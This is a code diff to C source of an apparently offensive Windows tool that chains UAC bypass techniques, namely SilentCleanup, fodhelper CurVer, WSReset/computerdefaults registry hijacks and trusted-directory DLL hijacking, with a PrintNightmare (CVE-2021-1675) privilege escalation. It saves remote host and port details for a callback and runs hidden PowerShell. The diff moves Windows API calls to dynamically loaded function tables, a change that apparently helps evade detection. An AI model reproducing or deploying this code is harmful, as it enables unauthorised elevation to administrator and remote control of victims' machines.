@@ -8,6 +8,8 @@
 #include "DllHijacking.h"
 #include "PrintNightmareLPE.h"
 
+#include "LoadAPI.h"
+
 #define MAX_CLEANUP_TRY     10
 #define SLEEP_1_SEC         1000
 
@@ -27,12 +29,12 @@ UAC_BYPASS_DATA uac_bypass_data[] = {
     {"WSReset", "AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2","C:\\Windows\\System32\\WSReset.exe"},
 };
 
-BOOL ExploitCleanUp(char* regPath, char* regName) {
+BOOL ExploitCleanUp(Advapi32_API advapi32, char* regPath, char* regName) {
     char* lpSubKey = (char*)malloc(MAX_PATH + 1);
     if (lpSubKey != NULL) {
         BOOL result;
         sprintf_s(lpSubKey, MAX_PATH + 1, "%s\\%s", regPath, regName);
-        result = RegDelnodeRecurse(HKEY_CURRENT_USER, lpSubKey);
+        result = RegDelnodeRecurse(advapi32, HKEY_CURRENT_USER, lpSubKey);
         free(lpSubKey);
         return result;
     }
@@ -40,7 +42,7 @@ BOOL ExploitCleanUp(char* regPath, char* regName) {
     return FALSE;
 }
 
-BOOL ExploitSilentCleanup(char* PathExeToRun, WCHAR* ipAddress, char* port) {
+BOOL ExploitSilentCleanup(Advapi32_API advapi32, char* PathExeToRun, WCHAR* ipAddress, char* port) {
     BOOL returnValue = FALSE;
     PVOID pOldVal = NULL;
 
@@ -51,15 +53,15 @@ BOOL ExploitSilentCleanup(char* PathExeToRun, WCHAR* ipAddress, char* port) {
     sprintf_s(command, MAX_BUFFER, "powershell -windowstyle hidden %s;exit;", PathExeToRun);
 
     DisableWindowsRedirection(&pOldVal);
-    if (SetRegistryValue(HKEY_CURRENT_USER, (char*)"Environment", "windir", command)) {
-        if (SaveRHostInfo(ipAddress, port)) {
+    if (SetRegistryValue(advapi32, HKEY_CURRENT_USER, (char*)"Environment", "windir", command)) {
+        if (SaveRHostInfo(advapi32, ipAddress, port)) {
 
             // schtasks.exe error ???
             returnValue = Run("schtasks.exe", "/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I");
         } else
             printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to save RHOST/RPORT information");
 
-        ExploitCleanUp("Environment", "windir");
+        ExploitCleanUp(advapi32, "Environment", "windir");
     }
     RevertWindowsRedirection(pOldVal);
 
@@ -68,7 +70,7 @@ BOOL ExploitSilentCleanup(char* PathExeToRun, WCHAR* ipAddress, char* port) {
 }
 
 
-BOOL ExploitOpenShell(char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPASS_TEC UacBypassTec) {
+BOOL ExploitOpenShell(Advapi32_API advapi32, char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPASS_TEC UacBypassTec) {
     BOOL returnValue = FALSE;
     PVOID pOldVal = NULL;
     char* regKey = (char*)malloc(MAX_PATH +1);
@@ -80,23 +82,23 @@ BOOL ExploitOpenShell(char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPA
 
     DisableWindowsRedirection(&pOldVal);
 
-    if (checkKey(regKey)) {
-        returnValue = SetRegistryValue(HKEY_CURRENT_USER, (char*)regKey, "DelegateExecute", "");
-        returnValue &= SetRegistryValue(HKEY_CURRENT_USER, (char*)regKey, "", PathExeToRun);
+    if (checkKey(advapi32, regKey)) {
+        returnValue = SetRegistryValue(advapi32, HKEY_CURRENT_USER, (char*)regKey, "DelegateExecute", "");
+        returnValue &= SetRegistryValue(advapi32, HKEY_CURRENT_USER, (char*)regKey, "", PathExeToRun);
         if (returnValue) {
-            if (SaveRHostInfo(ipAddress, port)) {
+            if (SaveRHostInfo(advapi32, ipAddress, port)) {
                 returnValue = RunAs(uac_bypass_data[UacBypassTec].targetExe, NULL);
             }else
                 printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to save RHOST/RPORT information");
         }
-        ExploitCleanUp("Software\\Classes", uac_bypass_data[UacBypassTec].regKeyName);
+        ExploitCleanUp(advapi32, "Software\\Classes", uac_bypass_data[UacBypassTec].regKeyName);
     }
     RevertWindowsRedirection(pOldVal);
 
     free(regKey);
     return returnValue;
 }
-BOOL ExploitCurVer(char* PathExeToRun, WCHAR* ipAddress, char* port){
+BOOL ExploitCurVer(Advapi32_API advapi32, Shell32_API shell32, char* PathExeToRun, WCHAR* ipAddress, char* port){
     PVOID pOldVal = NULL;
     const char* regKeys[] = {
         "Software\\Classes\\%s","\\Shell\\Open\\command",
@@ -118,24 +120,24 @@ BOOL ExploitCurVer(char* PathExeToRun, WCHAR* ipAddress, char* port){
 
     GenRandDriverName(extName + 1, 3);
     sprintf_s(regKeyCommand, regKeyCommandLen, regKeys[0], extName);
-    while (CheckExistKey(regKeyCommand) && strcmp(extName, ".pwn") != 0){
+    while (CheckExistKey(advapi32, regKeyCommand) && strcmp(extName, ".pwn") != 0){
         GenRandDriverName(extName + 1, 3);
         sprintf_s(regKeyCommand, regKeyCommandLen, regKeys[0], extName);
     }
     strcat_s(regKeyCommand, regKeyCommandLen, regKeys[1]);
 
     DisableWindowsRedirection(&pOldVal);
-    if (checkKey(regKeyCommand) && checkKey(regKeys[2])){
-        returnValue = SetRegistryValue(HKEY_CURRENT_USER, regKeyCommand, "", PathExeToRun);
-        returnValue &= SetRegistryValue(HKEY_CURRENT_USER, (char*)regKeys[2], "", extName);
+    if (checkKey(advapi32, regKeyCommand) && checkKey(advapi32, regKeys[2])){
+        returnValue = SetRegistryValue(advapi32, HKEY_CURRENT_USER, regKeyCommand, "", PathExeToRun);
+        returnValue &= SetRegistryValue(advapi32, HKEY_CURRENT_USER, (char*)regKeys[2], "", extName);
         if (returnValue){
-            if (SaveRHostInfo(ipAddress, port)){
-                returnValue = ((int)ShellExecuteA(NULL, "runas", "C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, SW_SHOWNORMAL) > 32);
+            if (SaveRHostInfo(advapi32, ipAddress, port)){
+                returnValue = ((int)shell32.ShellExecuteAF(NULL, "runas", "C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, SW_SHOWNORMAL) > 32);
                 Sleep(1000);
             } else
                 printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to save RHOST/RPORT information");
-            ExploitCleanUp((char*)"Software\\Classes", "ms-settings");
-            ExploitCleanUp((char*)"Software\\Classes", extName);
+            ExploitCleanUp(advapi32, (char*)"Software\\Classes", "ms-settings");
+            ExploitCleanUp(advapi32, (char*)"Software\\Classes", extName);
         }
     }
     RevertWindowsRedirection(pOldVal);
@@ -147,38 +149,42 @@ BOOL ExploitCurVer(char* PathExeToRun, WCHAR* ipAddress, char* port){
 
 
 
-BOOL RunUacBypass(char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPASS_TEC UacBypassTec, char* wincatDefaultDir) {
+BOOL RunUacBypass(Kernel32_API kernel32, Advapi32_API advapi32, Shell32_API shell32, char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPASS_TEC UacBypassTec, char* wincatDefaultDir) {
     BOOL returnValue = FALSE;
     if (UacBypassTec == UAC_BYPASS_PRINT_NIGHTMARE){
         printMsg(STATUS_OK, LEVEL_DEFAULT, "Local Privilege Escalation: 'PrintNightmare - (CVE-2021-1675)'\n");
-        returnValue = ExploitPrintNightmareLPE(PathExeToRun, ipAddress, port, wincatDefaultDir);
+        returnValue = ExploitPrintNightmareLPE(advapi32,PathExeToRun, ipAddress, port, wincatDefaultDir);
     } else{
-        if (!IsUACEnabled()){
+        if (!IsUACEnabled(advapi32)){
             printMsg(STATUS_WARNING, LEVEL_DEFAULT, "UAC is disabled.\n");
-            if (!SaveRHostInfo(ipAddress, port)){
+            if (!SaveRHostInfo(advapi32, ipAddress, port)){
                 printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to save RHOST information");
                 return FALSE;
             }
             return RunAs(PathExeToRun, NULL);
         } else{
-            UAC_POLICY uacPolicy = CheckUACSettings();
+            UAC_POLICY uacPolicy = CheckUACSettings(advapi32);
             if (uacPolicy == UAC_POLICY_DEFAULT || uacPolicy == UAC_POLICY_DISABLE){
 
                 if (UacBypassTec == UAC_BYPASS_COMP_SILENT_CLEAN){
                     printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: 'Silent Cleanup'\n");
-                    returnValue = ExploitSilentCleanup(PathExeToRun, ipAddress, port);
+                    returnValue = ExploitSilentCleanup(advapi32, PathExeToRun, ipAddress, port);
 
                 } else if (UacBypassTec == UAC_BYPASS_FOD_HELP_CUR_VER){
                     printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: 'Fodhelper - CurVer'\n");
-                    returnValue = ExploitCurVer(PathExeToRun, ipAddress, port);
+                    returnValue = ExploitCurVer(advapi32, shell32, PathExeToRun, ipAddress, port);
                 } else if (UacBypassTec == UAC_BYPASS_COMP_TRUSTED_DIR){
 
                     printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: 'DLL hijacking - Trusted Directories'\n");
-                    returnValue = ExploitTrustedDirectories(PathExeToRun, ipAddress, port);
+                    returnValue = ExploitTrustedDirectories(kernel32, advapi32, PathExeToRun, ipAddress, port);
                 } else{
-
-                    printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: '%s'\n", uac_bypass_data[UacBypassTec].exploitName);
-                    returnValue = ExploitOpenShell(PathExeToRun, ipAddress, port, UacBypassTec);
+                    if (UacBypassTec >= 0 && UacBypassTec < 2) {
+                        printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: '%s'\n", uac_bypass_data[UacBypassTec].exploitName);
+                        returnValue = ExploitOpenShell(advapi32, PathExeToRun, ipAddress, port, UacBypassTec);
+                    }
+                    else {
+                        printf("\t[x] Error var UacBypassTec\n");
+                    }
 
                 }
             }
